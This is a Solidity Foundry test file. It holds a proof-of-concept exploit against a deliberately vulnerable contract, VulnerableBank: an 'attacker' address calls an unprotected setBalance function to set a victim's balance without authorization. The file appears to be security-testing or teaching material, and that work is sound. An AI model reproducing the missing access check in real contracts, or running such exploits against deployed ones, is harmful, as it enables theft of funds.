// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is BaseTestWithBalanceLog {
    VulnerableBank target;

    function setUp() public override {
        target = new VulnerableBank();
    }

    function testExploit() public {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");

        // Start prank with the attacker
        vm.prank(attacker);

        // Step 1: Set arbitrary balance for the victim's account using setBalance
        target.setBalance(victim, 1000);

        // Validate that the balance has been changed by the attacker without authorization
        assertEq(target.balances(victim), 1000);
    }
}